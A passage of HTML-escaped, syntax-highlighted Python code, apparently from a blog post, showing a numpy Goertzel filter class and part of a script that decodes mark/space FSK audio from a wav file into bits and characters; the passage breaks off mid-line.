class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;37&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;# goertzel.py&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;&amp;quot;&amp;quot;&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;Module to create a Goertzel filter&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;Original source: https://github.com/laurenschneider/audiodecoder&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;&amp;quot;&amp;quot;&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; numpy &lt;span class=&#34;keyword&#34;&gt;as&lt;/span&gt; np&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;class&lt;/span&gt; &lt;span class=&#34;title class_&#34;&gt;Goertzel&lt;/span&gt;():&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;__init__&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;self, rate, freq&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        self.normalize = &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        self.coeffs = &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        self.sample_rate = rate&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        self.target_freq = freq&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;calculate_coeff&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;self&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;string&#34;&gt;&amp;quot;&amp;quot;&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;        Precompute coefficients needed for filter equation.&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;        Coeff formulas courtesy of Prof. Massey&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;        &amp;quot;&amp;quot;&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        n = &lt;span class=&#34;number&#34;&gt;160&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        w0 = (&lt;span class=&#34;number&#34;&gt;2&lt;/span&gt; * np.pi * self.target_freq) / self.sample_rate&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        self.normalize = np.exp(&lt;span class=&#34;number&#34;&gt;1j&lt;/span&gt; * w0 * n)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        self.coeffs = np.array([np.exp((-&lt;span class=&#34;number&#34;&gt;1j&lt;/span&gt;) * w0 * k) &lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; k &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;range&lt;/span&gt;(n)])&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;filter&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;self, samples&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;string&#34;&gt;&amp;quot;&amp;quot;&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;        Goertzel filter equation&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;        :param samples: array of samples&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;        :returns: amplitude&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;        &amp;quot;&amp;quot;&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        y = self.normalize * &lt;span class=&#34;number&#34;&gt;160&lt;/span&gt; * np.dot(self.coeffs, samples)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        ampl = np.&lt;span class=&#34;built_in&#34;&gt;abs&lt;/span&gt;(y)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; ampl&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;figure class=&#34;highlight python&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;39&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;40&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;41&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;42&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;43&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;44&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;45&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;46&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;47&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;48&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;49&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;50&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;51&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;52&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;53&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;54&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;55&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;56&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;57&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;58&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;59&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;60&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;61&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;62&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;63&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;64&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;65&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;66&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;67&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;68&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;69&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;70&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;71&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;72&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;73&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;74&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;75&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;76&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;77&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;78&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;79&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;80&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;81&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;82&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;83&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;84&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;85&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;86&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;87&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;88&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;89&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;90&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;91&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;92&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;93&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;94&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;95&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;96&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;97&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;98&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;99&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;100&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;101&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;102&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;103&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;104&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;105&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;106&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;107&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;108&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;109&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;110&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;111&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;112&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;113&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;114&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;115&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;116&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;117&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;118&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;119&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;120&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;121&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;122&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;123&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;124&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;125&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;126&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;127&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;128&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;129&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;130&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;131&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;132&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;133&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;134&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;135&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;136&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;137&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;138&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;139&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;140&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;141&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;142&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;143&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;144&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;145&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;146&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;147&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;148&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;149&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;150&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;151&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;152&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;153&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;154&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;155&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;156&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;157&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;# decode.py&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;&amp;quot;&amp;quot;&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;Decode a wav file using a Goertzel filter.&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;Modified from https://github.com/laurenschneider/audiodecoder&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;&amp;quot;&amp;quot;&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;from&lt;/span&gt; goertzel &lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; Goertzel&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; numpy &lt;span class=&#34;keyword&#34;&gt;as&lt;/span&gt; np&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; os&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;from&lt;/span&gt; scipy.io &lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; wavfile&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;DATA = os.path.dirname(os.path.abspath(__file__))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;filepath = os.path.join(DATA, &lt;span class=&#34;string&#34;&gt;&amp;quot;filename.wav&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;# Read sample rate and data from audio file&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;rate, data = wavfile.read(filepath)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;message = &lt;span class=&#34;string&#34;&gt;&amp;#x27;&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;bit_string = &lt;span class=&#34;string&#34;&gt;&amp;#x27;&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;mark_freq = &lt;span class=&#34;number&#34;&gt;2225&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;space_freq = &lt;span class=&#34;number&#34;&gt;2025&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;mark_filter = Goertzel(rate, mark_freq)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;space_filter = Goertzel(rate, space_freq)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;# calculate coefficients for each filter&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;mark_filter.calculate_coeff()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;space_filter.calculate_coeff()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; i &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;range&lt;/span&gt;(data.size + &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;comment&#34;&gt;# for each chunk of 160 samples&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; i%&lt;span class=&#34;number&#34;&gt;160&lt;/span&gt; == &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;and&lt;/span&gt; i != &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        start = i - &lt;span class=&#34;number&#34;&gt;160&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        end = i&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        samples = data[start:end]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;comment&#34;&gt;# get amplitutes of sample set&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        mark_amp = mark_filter.&lt;span class=&#34;built_in&#34;&gt;filter&lt;/span&gt;(samples)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        space_amp = space_filter.&lt;span class=&#34;built_in&#34;&gt;filter&lt;/span&gt;(samples)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; mark_amp &amp;gt; space_amp:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;comment&#34;&gt;# bit is 1&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            to_add = &lt;span class=&#34;string&#34;&gt;&amp;#x27;1&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;comment&#34;&gt;# bit is zero&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            to_add = &lt;span class=&#34;string&#34;&gt;&amp;#x27;0&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        bit_string = to_add + bit_string&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; x &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;range&lt;/span&gt;(&lt;span class=&#34;number&#34;&gt;10&lt;/span&gt;, &lt;span class=&#34;built_in&#34;&gt;len&lt;/span&gt;(bit_string)+&lt;span class=&#34;number&#34;&gt;10&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; x%&lt;span class=&#34;number&#34;&gt;10&lt;/span&gt; == &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        start = x - &lt;span class=&#34;number&#34;&gt;9&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        end = x - &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        message = &lt;span class=&#34;built_in&#34;&gt;chr&lt;/span&gt;(&lt;span 